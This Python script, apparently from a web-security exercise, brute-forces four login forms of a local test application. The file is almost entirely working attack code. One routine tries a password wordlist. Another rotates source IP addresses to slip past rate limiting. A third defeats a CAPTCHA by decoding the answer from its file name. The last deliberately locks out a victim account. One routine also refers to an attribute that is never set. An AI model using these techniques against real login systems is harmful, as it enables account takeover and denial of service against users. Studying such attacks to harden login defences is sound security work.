# imports
import json
import time
import base64
import requests
import http.client
import urllib.parse
from termcolor import colored

'''
	Login form bruteforce class:
		Attempts to evade the implemented security for each login form
'''
class Attack():
	def __init__(self):
		# login route
		self.url = 'http://localhost:8000/secureweb/login/'

		# email to bruteforce
		self.email = ''

		# list of proxies
		self.proxies = [line.strip() for line in open('proxies', 'r')]

		# list of commonly used passwords
		self.passwords = [line.strip() for line in open('passwords', 'r')]

		# select login form to attack
		self.select()


	# select login form to try to attack
	def select(self):
		# Set login form information
		print('\nNote: attacking form 2 does not work on Windows machines')
		route = input('Login form number to attack [1, 4]: ')
		self.email = input('Email address to attack: ')

		# launch attack
		if route == '1':
			self.form_1()

		if route == '2':
			self.form_2()

		if route == '3':
			self.form_3()

		if route == '4':
			self.form_4()


	# attack login form #1
	def form_1(self):
		# try each password until success status
		for index, password in enumerate(self.passwords):
			# create login data
			data = {
				'username'				: self.email,
				'password'				: password,
				"login_type"			: "1"
			}

			# send the request
			response = requests.post(self.url, data=data)

			# verify login status
			if b'Invalid' in response.content:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.email, password}')
			else:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.email, password}')
				break


	# attack login form #2
	def form_2(self, index=0):
		
		# once ip range ends, change virtual ip address range to next in list
		ranges = [ip for ip in self.proxies if ip.endswith('.254')]
		range_reached = False
  
		# rotate proxies
		for proxy in self.proxies:
			# use current IP address 4 times
			for _ in range(4):
				password = self.passwords[index] 
				data = f'username={self.username}&password={password}&login_type={2}'
    
				# bind proxy address, skip if range changed (last ip in range)
				socket = http.client.HTTPConnection('localhost', 8000, source_address=(proxy, 0))
				if range_reached:
					continue 
     
				# send login request
				socket.request('POST', '/secureweb/login/', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
				
				response = socket.getresponse()
				response = response.read().decode('utf-8')
				
				# verify login status
				if 'Invalid' in response:
					c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
					print(f'{c} : {self.username, password}')
				else:
					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
					print(f'\n{c} : {self.username, password}')
					return

				# close socket, increase password index
				socket.close()
				if index + 1 >= len(self.passwords):
					return
				else:
					index += 1
     
			# check if proxy range changed, reset range flag
			range_reached = False
			if proxy in ranges:
				range_reached = True
    
		# sleep then attempt next set of passwords
		if index < len(self.passwords):
			c = '[' + colored('Waiting', 'yellow', attrs=['bold']) + ']'
			print(f'\n{c} : will continue in 75 seconds')
			time.sleep(75)
			self.form_2(index)

   
	# attack login form #3
	def form_3(self):
		# get captcha end points
		generate_url = 'http://localhost:8000/secureweb/captcha_generate/'		
		solve_url    = 'http://localhost:8000/secureweb/captcha_submit/'		
		
		for index, password in enumerate(self.passwords):
			# generate captcha
			captcha = (requests.get(generate_url)).content

			# solve captcha
			captcha_data = json.loads(captcha.decode('utf-8'))
			value = captcha_data['captcha']		
			value = value.split('captcha/')[1].split('.')[0]

			# url and base64 decode captcha
			answer = urllib.parse.unquote(value)
			decoded = base64.b64decode(answer)
			decoded = decoded.decode('utf-8')

			# get expected captcha data
			data = {
				'captcha_input' : decoded,
				'captcha_name'  : value
			}

			# submit captcha
			submission = requests.post(solve_url, data=data)
			if b'correct' in submission.content:
				# display solved captcha
				c = '[' + colored(f'Captcha {index}', 'magenta', attrs=['bold']) + ']'
				print(f'{c} : "{decoded}" solved')
       
				# submit login attempt
				data = {
					'username'	 : self.email,
					'password'	 : password,
					"login_type" : "3"
				}
				login = requests.post(self.url, data=data)
				
    			# verify login status
				if b'Invalid' in login.content:
					c = '[' + colored(f'Failed  {index}', 'red', attrs=['bold']) + ']'
					print(f'{c} : {self.email, password}')
				else:
					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
					print(f'\n{c} : {self.email, password}')
					break
	
 
	# attack login form #4
	def form_4(self):
		'''
			denial-of-service attack, since the attacker can't access 
   			the admin account, the attacker's goal now is to lock the 
      		accounts of all users of the web application
		'''
  
		# lockout a specified user, try random passwords until the user is locked out
		data = {
			'username'	 : self.email,
			'password'	 : "password",
			"login_type" : "4"
		}
  
		for _ in range(100):
			response = requests.post(self.url, data=data)
			c = '[' + colored(f'Attacking', 'blue') + ']'
			print(f'{c} : email -> {self.email}')
   
			if b'locked' in response.content:
				c = '[' + colored(f' Successfully Locked ', 'magenta', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : Email {self.email}')
				break


# start
if __name__ == '__main__':
	attack = Attack()